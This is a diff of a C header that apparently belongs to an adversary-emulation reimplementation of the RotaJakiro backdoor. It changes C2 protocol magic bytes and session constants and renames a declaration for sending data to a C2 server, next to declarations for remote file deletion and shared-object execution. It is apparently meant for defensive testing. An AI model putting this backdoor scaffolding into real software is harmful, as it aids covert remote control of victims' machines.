@@ -17,10 +17,14 @@
 //RotaJakiro Magic Headers
 const static unsigned char magicBytes[] = {0x3B, 0x91, 0x01, 0x10};
 const static unsigned char initialBytes[] = {0x21, 0x70, 0x27, 0x20};
-static unsigned char sessionId[4] = {0x01, 0x02, 0x03, 0x04};
-static unsigned char payloadLen[] = {0x0f};
-static unsigned char keyLen[] = {0x00,0x00};
-static unsigned char cmd_id[] = {0x00, 0x00, 0x00, 0x00};
+//const unsigned char sessionId[4] = {0x01, 0x02, 0x03, 0x04};
+const static unsigned char sessionId[4] = {0x01, 0x02, 0x03, 0x04};
+
+// declared in c2_comand
+extern unsigned char payloadLen[2];
+extern unsigned char keyLen[2];
+extern unsigned char cmd_id[4];
+
 const static unsigned char marker_1[] = {0xc2, 0x00};
 const static unsigned char marker_2[] = {0xe2, 0x00};
 const static unsigned char marker_3[] = {0xc2, 0x00};
@@ -119,8 +123,7 @@ bool c2_delete_file(char *fpath);
 //    About:
 //       Execute Shared Object
 //    Result: Loading and execution of Shared Objection
-//    MITRE ATT&CK Techniques: N/A
-//         TODO - in new version of ATT&CK?
+//    MITRE ATT&CK Techniques: TBD
 //    CTI:
 //        https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/
 //    Other References:
@@ -164,13 +167,13 @@ int parse_c2_payload_len(char *buffer);
 char *parse_c2_payload(char *buffer, int length);
 
 
-// build_c2_response2
+// build_c2_response
 //    About:
 //       Explicitly specify the size of data to send back to c2 server
 //    Result: void, data is sent to server
 //    MITRE ATT&CK Techniques: N/A
 //    CTI: N/A
 //    Other References: N/A
-void build_c2_response2(char *buffer, int buffer_size, char *cmd_id, int sock);
+void build_c2_response(char *buffer, int buffer_size, char *cmd_id, int sock);
 
 #endif // C2_COMMANDS_H_
